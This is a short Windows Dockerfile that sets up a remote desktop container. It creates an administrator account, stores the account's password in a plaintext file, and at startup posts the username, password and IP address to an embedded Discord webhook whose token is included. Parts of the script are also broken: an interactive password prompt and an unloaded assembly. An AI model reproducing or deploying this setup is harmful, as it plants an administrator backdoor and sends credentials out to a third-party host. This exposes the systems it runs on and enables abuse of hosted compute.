# Use the Windows 11 base image
FROM mcr.microsoft.com/windows:21H2

# Set working directory
WORKDIR C:\app

# Install necessary tools
RUN powershell -Command \
    "Set-ExecutionPolicy Bypass -Scope Process -Force;"

# Expose the RDP port
EXPOSE 3389

# Create an RDP user and generate a random password
RUN powershell -Command \
    "net user RDPUser * /add; \
     net localgroup administrators RDPUser /add; \
     $password = [System.Web.Security.Membership]::GeneratePassword(12, 2); \
     net user RDPUser $password; \
     echo $password > C:\rdp_password.txt;"

# Start RDP and send credentials to a webhook
CMD powershell -Command \
    "$password = Get-Content C:\rdp_password.txt; \
     $ip = (ipconfig | Select-String -Pattern 'IPv4').Line.Split(':')[-1].Trim(); \
     Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1289955380323160127/6JzbyzLROIo80Hb4uh3ImGpEPg2pKW5U1bLenvOcL7uqxd4bAxXbZaPsAsk9xO66wn35' -Method Post -Body (@{username='RDPUser'; password=$password; ip=$ip} | ConvertTo-Json); \
     Start-Service -Name TermService; \
     while ($true) { Start-Sleep -Seconds 3600; }"
